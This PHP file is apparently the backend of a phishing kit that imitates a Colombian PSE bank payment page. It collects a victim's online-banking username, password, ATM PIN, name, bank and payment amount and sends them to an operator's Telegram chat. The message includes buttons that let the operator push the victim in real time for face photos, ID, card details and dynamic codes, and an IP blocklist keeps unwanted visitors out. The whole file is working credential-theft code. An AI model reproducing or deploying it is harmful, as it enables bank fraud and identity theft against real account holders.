<?php
// --- IP BLACKLIST GLOBAL CHECK ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}
$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}
// ---------------------------------

session_start();
header('Content-Type: application/json');
header('X-Robots-Tag: noindex, nofollow, noarchive');

$logPath = __DIR__ . '/../log_pse.txt';
$log = function ($msg) use ($logPath) {
    $timestamp = date('Y-m-d H:i:s');
    $line = "$timestamp | $msg\n";
    file_put_contents($logPath, $line, FILE_APPEND | LOCK_EX);
};

$log("═══════════════════════════════════════════════════════════════");
$log("=== INICIO procesar_clave.php ===");

$rawInput = file_get_contents('php://input');
$jsonInput = json_decode($rawInput, true);
if (!is_array($jsonInput)) {
    $jsonInput = [];
}

$clave = $_POST['clave'] ?? ($jsonInput['clave'] ?? '');
$transactionId = $_POST['transactionId']
    ?? $_POST['session_id']
    ?? ($jsonInput['transactionId'] ?? '')
    ?? ($jsonInput['session_id'] ?? '');
$usuario = $_POST['usuario'] ?? ($jsonInput['usuario'] ?? '');
$contrasena = $_POST['contraseña'] ?? $_POST['password'] ?? ($jsonInput['contraseña'] ?? ($jsonInput['password'] ?? ''));
$tbdatos = $jsonInput['tbdatos'] ?? [];
if (!is_array($tbdatos)) {
    $tbdatos = [];
}

$log("Clave length: " . strlen($clave));
$log("TransactionId: $transactionId");
$log("Usuario: $usuario");

if (empty($clave) || empty($transactionId)) {
    $log("ERROR: Datos incompletos - clave o transactionId vacío");
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$userIp = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconocido';
$device = 'PC';
if (stripos($userAgent, 'Mobile') !== false) {
    $device = 'Movil';
}
if (stripos($userAgent, 'Tablet') !== false) {
    $device = 'Tablet';
}

$config = require __DIR__ . '/config.php';
if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $globalPath = __DIR__ . '/../../../config.php';
    if (file_exists($globalPath)) {
        $config = require $globalPath;
    }
}

if (empty($config['bot_token']) || empty($config['chat_id'])) {
    $log("ERROR: Config incompleta");
    echo json_encode(['status' => 'error', 'message' => 'Configuración inválida']);
    exit;
}

$nombreCliente = !empty($tbdatos['nombre']) ? $tbdatos['nombre'] : (!empty($tbdatos['ownerName']) ? $tbdatos['ownerName'] : 'No registrado');
$nombreBanco = !empty($tbdatos['banco']) ? $tbdatos['banco'] : 'NO ESPECIFICADO';
$safeUsuario = htmlspecialchars($usuario, ENT_QUOTES, 'UTF-8');
$safeContrasena = htmlspecialchars($contrasena, ENT_QUOTES, 'UTF-8');
$safeClave = htmlspecialchars($clave, ENT_QUOTES, 'UTF-8');

$amount = '';
foreach (['total_pagar', 'monto', 'amount', 'valor', 'valor_pagar', 'total'] as $field) {
    if (isset($jsonInput[$field]) && $jsonInput[$field] !== '' && $jsonInput[$field] !== null) {
        $amount = $jsonInput[$field];
        break;
    }
}
if ($amount === '' && is_array($tbdatos)) {
    foreach (['total_pagar', 'monto', 'amount', 'valor', 'valor_pagar', 'total'] as $field) {
        if (isset($tbdatos[$field]) && $tbdatos[$field] !== '' && $tbdatos[$field] !== null) {
            $amount = $tbdatos[$field];
            break;
        }
    }
}
if ($amount === '') {
    $amount = '0';
}

$message = "● CAJERO - {$nombreCliente}\n\n";
$message .= "🟢 Logo: {$nombreBanco}\n\n";
$message .= "🟢 Usuario: {$safeUsuario}\n";
$message .= "🟢 Contraseña: {$safeContrasena}\n";
$message .= "🟢 Clave Cajero: {$safeClave}\n\n";
$message .= "🟢 Monto: \${$amount}\n\n";
$message .= "🟢 IP: {$userIp} | Device: {$device} | " . date('d/m/Y, H:i:s') . "\n\n";
$message .= "🐙 @FU7UR4MA 🐙";

$keyboard = [
    [
        ['text' => 'Cara', 'callback_data' => "dinamica_cara:$transactionId"],
        ['text' => 'Cédula', 'callback_data' => "dinamica_cedula:$transactionId"]
    ],
    [
        ['text' => 'Tarjeta', 'callback_data' => "dinamica_tarjeta:$transactionId"],
        ['text' => 'Dinámica', 'callback_data' => "dinamica_dinamica:$transactionId"]
    ],
    [
        ['text' => 'Error Logo', 'callback_data' => "dinamica_error_logo:$transactionId"],
        ['text' => 'Cajero', 'callback_data' => "dinamica_cajero:$transactionId"]
    ],
    [
        ['text' => 'Finalizar', 'callback_data' => "dinamica_finalizar:$transactionId"]
    ]
];

$telegramData = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
];

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($telegramData),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
    CURLOPT_TIMEOUT => 30,
    CURLOPT_CONNECTTIMEOUT => 10,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

if ($curlError) {
    $log("CURL ERROR: $curlError");
    echo json_encode(['status' => 'error', 'message' => 'Error de conectividad: ' . $curlError]);
    exit;
}

$log("HTTP Code: $httpCode");
$result = json_decode($response, true);
if (!$result || !is_array($result)) {
    $log("ERROR: Respuesta JSON inválida");
    echo json_encode(['status' => 'error', 'message' => 'Respuesta inválida de Telegram']);
    exit;
}

if (empty($result['ok'])) {
    $log("ERROR: Telegram retornó error: " . ($result['description'] ?? 'Sin descripción'));
    echo json_encode(['status' => 'error', 'message' => $result['description'] ?? 'Error en Telegram']);
    exit;
}

$messageId = $result['result']['message_id'] ?? null;
if (!$messageId) {
    $log("ERROR: messageId no encontrado");
    echo json_encode(['status' => 'error', 'message' => 'No se obtuvo messageId']);
    exit;
}

$_SESSION['claveTransactionId'] = $transactionId;
$_SESSION['claveMessageId'] = $messageId;

$log("✅ Envío exitoso!");
$log("MessageId: $messageId");
$log("=== FIN procesar_clave.php ===");
$log("═══════════════════════════════════════════════════════════════\n");

echo json_encode([
    'status' => 'success',
    'messageId' => $messageId,
    'transactionId' => $transactionId
]);
?>
